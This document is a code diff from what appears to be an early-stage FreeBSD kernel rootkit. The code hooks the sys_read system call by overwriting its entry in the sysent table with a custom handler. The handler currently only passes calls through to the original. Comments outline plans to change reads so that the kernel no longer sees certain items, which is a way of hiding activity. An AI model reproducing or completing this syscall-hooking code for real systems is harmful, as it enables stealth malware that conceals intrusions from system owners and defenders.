@@ -39,6 +39,9 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
     // value returned by og sys_read indicating success or if an error occured
     int original_sysread_return;
     // invoke og syscall
+    // original_sysread is pointer to the struct sys_read
+    // sy_call is a member of that struct
+    // ->, is accessing the member and invoking it
     original_sysread_return = original_sysread->sy_call(td, syscall_args);
 
     // check if an error occured
@@ -55,24 +58,19 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
     // else, return error;
     return original_sysread_return;
 
+    // do some functionality before the wrapper collects the response from CPU registers 
+
+    // what do these lines actually do???
+    // .sy_call = (sy_call_t *)custom_read, // Your custom handler function
+    // .sy_narg = 3,                       // Number of arguments for SYS_read
+    // options of where to commit out changes
+
+    // 1.
+    // change input before SYS_read gets invoked
+    // search for addresses of things to remove, make kernel not look for that within its execution
 
 
-
-
-
-// do some functionality before the wrapper collects the response from CPU registers 
-
-// what do these lines actually do???
-// .sy_call = (sy_call_t *)custom_read, // Your custom handler function
-// .sy_narg = 3,                       // Number of arguments for SYS_read
-// options of where to commit out changes
-
-// 1.
-// change input before SYS_read gets invoked
-// search for addresses of things to remove, make kernel not look for that within its execution
-
-
-// 2.
+    // 2.
 }
 
 
@@ -83,13 +81,36 @@ static int find_sysread_address (void) {
 
     // Store memory address of sysent table, See 4.
     original_sysread = &sysent[SYS_read];
-    
 
+    // temp check that theres a valid address for sys_read
+    if (&sysent[SYS_read] == NULL) {
+        uprintf("SYS_read entry in sysent table is NULL.\n");
+        return 2;  // Return error
+    }
+
+    // store address
+    original_sysread = &sysent[SYS_read];
+
+    // temp check to see if we stored the address
+    if (original_sysread == NULL) {
+        uprintf("Failed to get address of sysent[SYS_read].\n");
+        return 3;  // Return error
+    }
+
+    // check to see if the sy_call in the sys_read struct has a valid address
+    if (original_sysread->sy_call == NULL) {
+        uprintf("sy_call pointer in sysent[SYS_read] is NULL.\n");
+        return 4;  // Return error
+    }
+
+    // see if we can point to our custom handler
     if (original_sysread->sy_call) {
         uprintf("Sysread found at address: %p\n", original_sysread->sy_call);
-        // point to custom handler
+        // point to custom handler, with synchronization to avoid unwanted kernel behaiver
+        critical_enter();  // Enter critical section
         sysent[SYS_read].sy_call = (sy_call_t *)custom_sysread; 
-        // sysent[SYS_read].sy_call = (sy_call_t *)custom_read; // Replace
+        critical_exit();   // Exit critical section
+
         return 0;
     }
     else {
@@ -112,7 +133,10 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
             uprintf("No error with finding sysent table address.\n");
         }
         else {
-            uprintf("sysent table not found.\n");
+            uprintf("Problems!\n");
+            uprintf("Problems!\n");
+            uprintf("Problems!\n");
+            uprintf("error code: %d!\n", search_table_case);
         }
         break;
     case MOD_UNLOAD:
